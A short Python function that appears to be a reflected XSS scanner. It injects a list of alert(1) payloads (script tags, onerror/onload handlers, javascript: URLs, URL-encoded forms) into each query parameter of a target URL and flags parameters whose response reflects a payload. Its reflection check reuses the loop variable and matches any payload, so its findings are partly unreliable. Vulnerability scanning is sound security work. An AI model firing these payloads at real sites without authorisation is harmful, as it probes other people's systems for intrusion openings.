import requests

def scan_xss(url, params):
    # XSS payloads 
    payloads = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg onload='alert(1)'>",
        "javascript:alert(1)",
        "<body onload='alert(1)'>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<marquee/onstart=alert(1)>",
        "<input/onfocus=alert(1)>",
        "%3Cscript%3Ealert(1)%3C/script%3E",  
        "%3Cimg%20src='x'%20onerror='alert(1)'%3E", 
        "%3Csvg%20onload='alert(1)'%3E"  
    ]
    
    vulnerabilities = []
    
    for param in params:
        for payload in payloads:
            test_params = {key: (payload if key == param else value) for key, value in params.items()}
            
            try:
                response = requests.get(url, params=test_params)
                if any(payload in response.text for payload in payloads):
                    vulnerabilities.append((param, payload))
            except requests.RequestException as reqexception:
                print(f"Request failed: {reqexception}")
    
    return vulnerabilities
